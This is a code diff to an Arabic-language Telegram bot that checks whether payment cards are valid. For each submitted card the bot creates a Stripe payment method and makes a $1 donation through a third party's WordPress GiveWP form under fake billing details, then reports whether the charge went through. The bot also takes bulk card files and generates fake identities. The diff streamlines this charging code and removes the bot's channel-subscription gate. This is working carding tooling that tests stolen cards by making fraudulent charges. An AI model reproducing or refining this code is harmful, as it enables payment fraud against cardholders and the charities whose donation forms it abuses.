@@ -253,13 +253,10 @@ def get_top_users(limit=10):
     except:
         return []
 
-# ==================== CHANNEL SUBSCRIPTION CHECK ====================
+# ==================== CHANNEL SUBSCRIPTION CHECK (REMOVED) ====================
 def is_subscribed(user_id):
-    try:
-        chat_member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
-        return chat_member.status in ['member', 'creator', 'administrator']
-    except:
-        return False
+    # Always return True to bypass subscription check
+    return True
 
 # ==================== CARD TYPE DETECTION ====================
 def detect_card_type(card_number):
@@ -432,72 +429,32 @@ def check_card_on_gateway(card_data, gateway, form_data):
         'give_comment': '', 'card_name': 'riva', 'billing_country': 'US',
         'card_address': 'riva sj', 'card_address_2': '', 'card_city': 'tomrr',
         'card_state': 'NY', 'card_zip': '10090', 'give_action': 'purchase',
-        'give-gateway': 'stripe', 'action': 'give_process_donation', 'give_ajax': 'true',
+        'give-gateway': 'stripe', 'action': 'give_process_donation', 'give_ajax': 'true'
     }
     try:
-        s.post(f"{gateway['base_url']}/wp-admin/admin-ajax.php", headers=headers_ajax, data=data_ajax, timeout=REQUEST_TIMEOUT)
-    except:
-        pass
-    headers_stripe = {
-        'authority': 'api.stripe.com', 'accept': 'application/json',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-        'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site', 'user-agent': gateway['ua'],
-    }
-    stripe_data = f'type=card&billing_details[name]=riva++riva+&billing_details[email]={email}&billing_details[address][line1]=riva+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d&muid=3b562720-d431-4fa4-b092-278d4639a6f3&sid=70a0ddd2-988f-425f-9996-372422a311c4&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer={gateway["clean_url"]}&time_on_page=85758&key={pk}{sa_param}'
-    try:
-        e = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=stripe_data, timeout=REQUEST_TIMEOUT)
-        sr = e.json()
-        if 'error' in sr:
-            em = sr['error'].get('message', 'Unknown')
-            return {'gateway': gateway['display_name'], 'status': 'DECLINED', 'message': f"Declined | {em[:40]}", 'charged': False}
-        pm_id = sr['id']
-    except:
-        return {'gateway': gateway['display_name'], 'status': 'ERROR', 'message': 'Stripe API Error', 'charged': False}
-    headers_final = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': gateway['base_url'], 'referer': gateway['site_url'],
-        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-        'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1',
-        'upgrade-insecure-requests': '1', 'user-agent': gateway['ua'],
-    }
-    params_final = {'payment-mode': 'stripe', 'form-id': fi}
-    data_final = {
-        'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
-        'give-form-title': 'Give a Donation', 'give-current-url': gateway['site_url'],
-        'give-form-url': gateway['site_url'], 'give-form-minimum': '1.00',
-        'give-form-maximum': '999999.99', 'give-form-hash': nc,
-        'give-price-id': 'custom', 'give-amount': '1.00',
-        'give_stripe_payment_method': pm_id, 'payment-mode': 'stripe',
-        'give_first': 'riva', 'give_last': 'riva', 'give_email': email,
-        'give_comment': '', 'card_name': 'riva', 'billing_country': 'US',
-        'card_address': 'riva sj', 'card_address_2': '', 'card_city': 'tomrr',
-        'card_state': 'NY', 'card_zip': '10090', 'give_action': 'purchase',
-        'give-gateway': 'stripe',
-    }
-    try:
-        r4 = s.post(gateway['clean_url'], params=params_final, headers=headers_final, data=data_final, timeout=REQUEST_TIMEOUT)
-        response_msg = extract_stripe_response(r4.text)
-        if 'Charged' in response_msg:
-            return {'gateway': gateway['display_name'], 'status': 'CHARGED', 'message': response_msg, 'charged': True}
-        else:
-            return {'gateway': gateway['display_name'], 'status': 'DECLINED', 'message': response_msg, 'charged': False}
-    except:
-        return {'gateway': gateway['display_name'], 'status': 'ERROR', 'message': 'Submit Error', 'charged': False}
+        # Get Payment Method ID
+        stripe_pm_url = f'https://api.stripe.com/v1/payment_methods'
+        pm_data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&key={pk}{sa_param}'
+        pm_headers = {'User-Agent': gateway['ua'], 'Content-Type': 'application/x-www-form-urlencoded'}
+        r_pm = s.post(stripe_pm_url, data=pm_data, headers=pm_headers, timeout=REQUEST_TIMEOUT)
+        pm_json = r_pm.json()
+        if 'error' in pm_json:
+            return {'gateway': gateway['display_name'], 'status': 'DECLINED', 'message': pm_json['error'].get('message', 'PM Error'), 'charged': False}
+        pm_id = pm_json['id']
+        data_ajax['give_stripe_payment_method'] = pm_id
+        # Process Donation
+        r_final = s.post(f"{gateway['base_url']}/wp-admin/admin-ajax.php", data=data_ajax, headers=headers_ajax, timeout=REQUEST_TIMEOUT)
+        res_text = r_final.text
+        final_status = extract_stripe_response(res_text)
+        is_charged = "Charged" in final_status
+        return {'gateway': gateway['display_name'], 'status': 'SUCCESS' if is_charged else 'DECLINED', 'message': final_status, 'charged': is_charged}
+    except Exception as e:
+        return {'gateway': gateway['display_name'], 'status': 'ERROR', 'message': str(e), 'charged': False}
 
-# ==================== MESSAGE FORMATTING ====================
 def format_check_msg(card, category, result, bin_info, elapsed, user_name, gate_name, amount):
-    if isinstance(bin_info, str):
-        bin_info = {"brand": "N/A", "type": "N/A", "level": "N/A", "bank": "N/A", "country_name": "N/A", "country_flag": ""}
     card_brand = bin_info.get('brand', '').upper()
     if 'VISA' in card_brand:
-        brand_emoji = tge("5281007837730841762", "💳")
+        brand_emoji = tge("5278219081105811309", "💳")
         brand_emoji_fb = '💳'
     elif 'MASTERCARD' in card_brand or 'MASTER' in card_brand:
         brand_emoji = tge("5278219081105811309", "💳")
@@ -755,9 +712,7 @@ def stats_command(message):
 def info_command(message):
     if is_banned(message.from_user.id):
         return
-    if not is_subscribed(message.from_user.id):
-        bot.reply_to(message, f"⚠️ لازم تشترك في القناة أولاً:\n{CHANNEL_URL}")
-        return
+    # Subscription check removed
     try:
         parts = message.text.split()
         if len(parts) < 2:
@@ -785,9 +740,7 @@ def info_command(message):
 def generate_full_identity(message):
     if is_banned(message.from_user.id):
         return
-    if not is_subscribed(message.from_user.id):
-        bot.reply_to(message, f"⚠️ لازم تشترك في القناة أولاً:\n{CHANNEL_URL}")
-        return
+    # Subscription check removed
     try:
         cities_data = [
             {"city": "New York", "state": "NY", "zip": "10001"},
@@ -885,17 +838,8 @@ def start(message):
                 bot.send_message(ADMIN_ID, notify_msg, parse_mode='HTML')
             except:
                 pass
-        if not is_subscribed(user_id):
-            keyboard = types.InlineKeyboardMarkup()
-            keyboard.add(types.InlineKeyboardButton("📢 اشترك في القناة", url=CHANNEL_URL))
-            keyboard.add(types.InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data='check_sub'))
-            bot.send_message(
-                message.chat.id,
-                f"⚠️ <b>عذراً {name}</b>\n\nلازم تشترك في القناة عشان تستخدم البوت:\n{CHANNEL_URL}\n\nبعد الاشتراك اضغط على: تحقق من الاشتراك",
-                parse_mode='HTML',
-                reply_markup=keyboard
-            )
-            return
+        
+        # Subscription check bypass
         checks, old_level, new_level = 0, 1, 1
         try:
             with open('data.json', 'r') as f:
@@ -936,12 +880,10 @@ def start(message):
 
 @bot.callback_query_handler(func=lambda call: call.data == 'check_sub')
 def check_subscription(call):
-    if is_subscribed(call.from_user.id):
-        bot.answer_callback_query(call.id, "✅ تم التحقق، أهلاً بك!")
-        bot.delete_message(call.message.chat.id, call.message.message_id)
-        start(call.message)
-    else:
-        bot.answer_callback_query(call.id, "❌ لم تشترك بعد!", show_alert=True)
+    # Auto-success for manual check button if it still exists
+    bot.answer_callback_query(call.id, "✅ تم التحقق، أهلاً بك!")
+    bot.delete_message(call.message.chat.id, call.message.message_id)
+    start(call.message)
 
 @bot.callback_query_handler(func=lambda call: call.data == 'free_info')
 def show_free_info(call):
@@ -953,13 +895,13 @@ def show_free_info(call):
         bot.send_message(call.message.chat.id, "💎 البوت مجاني بالكامل - استمتع!")
 
 @bot.message_handler(commands=["broadcast", "bc"])
-def cc_command(message):
+def broadcast_command(message):
     if not is_admin(message.from_user.id):
         return
     msg = bot.reply_to(message, f"{BTN_ADD} قم بإرسال الرسالة التي تريد إذاعتها")
-    bot.register_next_step_handler(msg, process_cc)
+    bot.register_next_step_handler(msg, process_broadcast)
 
-def process_cc(message):
+def process_broadcast(message):
     if not is_admin(message.from_user.id):
         return
     try:
@@ -1017,9 +959,7 @@ def help_command(message):
 def stripe_check_noarg(message):
     if is_banned(message.from_user.id):
         return
-    if not is_subscribed(message.from_user.id):
-        bot.reply_to(message, f"⚠️ لازم تشترك في القناة أولاً:\n{CHANNEL_URL}")
-        return
+    # Subscription check removed
     bot.reply_to(message, f"{_L} Please enter the card\n{_L} Example: /chk 4xxxxx|12|2030|123", parse_mode='HTML')
 
 @bot.message_handler(func=lambda m: m.text and (m.text.lower().startswith('/chk ') or m.text.lower().startswith('.chk ')))
@@ -1030,9 +970,7 @@ def stripe_check_command(message):
     if not free_mode:
         bot.reply_to(message, "⛔ الفحص متوقف حالياً، جرب لاحقاً")
         return
-    if not is_subscribed(message.from_user.id):
-        bot.reply_to(message, f"⚠️ لازم تشترك في القناة أولاً:\n{CHANNEL_URL}")
-        return
+    # Subscription check removed
     if is_spam(message.from_user.id):
         bot.reply_to(message, "⏳ انتظر قليلاً قبل الفحص التالي (حد أقصى 5 فحوصات في الدقيقة)")
         return
@@ -1108,9 +1046,7 @@ def handle_document(message):
     if not free_mode:
         bot.reply_to(message, "⛔ الفحص متوقف حالياً، جرب لاحقاً")
         return
-    if not is_subscribed(message.from_user.id):
-        bot.reply_to(message, f"⚠️ لازم تشترك في القناة أولاً:\n{CHANNEL_URL}")
-        return
+    # Subscription check removed
     user_id = message.from_user.id
     if user_id in active_scans:
         bot.reply_to(message, f"{BTN_WARN} ما تقدر تفحص اكثر من ملف بنفس الوقت")
